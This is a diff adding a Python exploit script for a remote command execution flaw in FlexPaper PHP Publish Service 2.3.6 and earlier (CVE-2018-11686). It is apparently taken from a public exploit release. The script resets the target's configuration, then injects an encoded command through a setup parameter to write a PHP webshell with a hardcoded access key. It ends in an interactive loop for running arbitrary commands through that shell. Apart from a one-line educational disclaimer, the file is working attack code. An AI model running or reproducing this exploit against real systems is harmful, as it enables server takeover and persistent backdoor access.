@@ -1,0 +1,70 @@
+#!/usr/bin/env python
+#Exploit Title: FlexPaper PHP Publish Service <= 2.3.6 RCE
+#Date: March 2019
+#Exploit Author: Red Timmy Security - redtimmysec.wordpress.com
+#Vendor Homepage: https://flowpaper.com/download/
+#Version: <= 2.3.6
+#Tested on: Linux/Unix
+#CVE : CVE-2018-11686
+#Disclamer: This exploit is for educational purpose only
+#More details on https://redtimmysec.wordpress.com/2019/03/07/flexpaper-remote-code-execution/
+
+import sys
+import requests
+import readline
+import urllib2
+import ssl
+
+try:
+        url = sys.argv[1]
+except:
+        print "[-] usage $python shredpaper.py http://targert.com/flexpaper/"
+        print sys.exit(1)
+
+print """
+         __                  __                           
+   _____/ /_  ________  ____/ ____  ____ _____  ___  _____
+  / ___/ __ \/ ___/ _ \/ __  / __ \/ __ `/ __ \/ _ \/ ___/
+ (__  / / / / /  /  __/ /_/ / /_/ / /_/ / /_/ /  __/ /    
+/____/_/ /_/_/   \___/\__,_/ .___/\__,_/ .___/\___/_/     
+                          /_/         /_/                 
+"""
+
+print "[*] FlexPaper <= 2.3.6 Remote Command Execution - Red Timmy Security)"
+print "[*] Attacking %s" %url
+print "[*] Deleting target configuration file"
+payload = (("SAVE_CONFIG","1"),("PDF_Directory","/var/www/html/flex2.3.6/flexpaper/pdf"),("SWF_Directory","config/"),("LICENSEKEY",""),("splitmode","1"),("RenderingOrder_PRIM","flash"),("RenderingOrder_SEC","html"))
+url1 = url+"/php/change_config.php"
+r1 = requests.post(url1, data=payload)
+rx = requests.post(url1, data=payload) #resend
+shellcode = "%69%64%3b%65%63%68%6f%20%50%44%39%77%61%48%41%4b%43%69%52%72%5a%58%6b%67%50%53%41%6b%58%30%64%46%56%46%73%6e%59%57%4e%6a%5a%58%4e%7a%4a%31%30%37%43%67%70%70%5a%69%67%6b%61%32%56%35%50%54%30%6e%4d%44%6b%34%4e%7a%63%7a%4e%7a%59%78%4d%54%59%30%4e%7a%49%33%4e%44%49%33%4f%44%51%7a%4d%6a%51%34%4d%6a%52%74%65%47%31%74%65%47%30%6e%4b%58%73%4b%43%67%6c%6c%59%32%68%76%49%48%4e%6f%5a%57%78%73%58%32%56%34%5a%57%4d%6f%59%6d%46%7a%5a%54%59%30%58%32%52%6c%59%32%39%6b%5a%53%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4b%54%73%4b%43%6e%30%37%43%6a%38%2b%43%67%3d%3d%7c%62%61%73%65%36%34%20%2d%64%20%3e%24%28%70%77%64%29%2f%74%69%67%65%72%5f%73%68%65%6c%6c%2e%70%68%70%3b%69%64"
+
+print "[*] Uploading webshell.."
+url2 = url+"/php/setup.php?step=2&PDF2SWF_PATH="+shellcode
+r2 = requests.get(url2)
+print "[*] Checking if shell is uploaded successfully"
+
+webshell = url+ '/php/tiger_shell.php'
+
+check_shell = requests.get(webshell)
+if check_shell.status_code == 200:
+        print "[*] We got a shell"
+else:
+        print "[-] Exploit failed, die"
+        sys.exit(2)
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+while True:
+        cmd = raw_input("enter cmd>>")
+        cmd = cmd.strip()
+        cmd = cmd.encode('base64').strip().replace("\n","")
+        link = url+"/php/tiger_shell.php?cmd=%s&access=09877376116472742784324824mxmmxm" %cmd.strip()
+        #print link
+        try:
+                response = urllib2.urlopen(link, context=ctx)
+                page = response.read()
+                print page
+        except Exception as exc:
+                print exc
+                continue
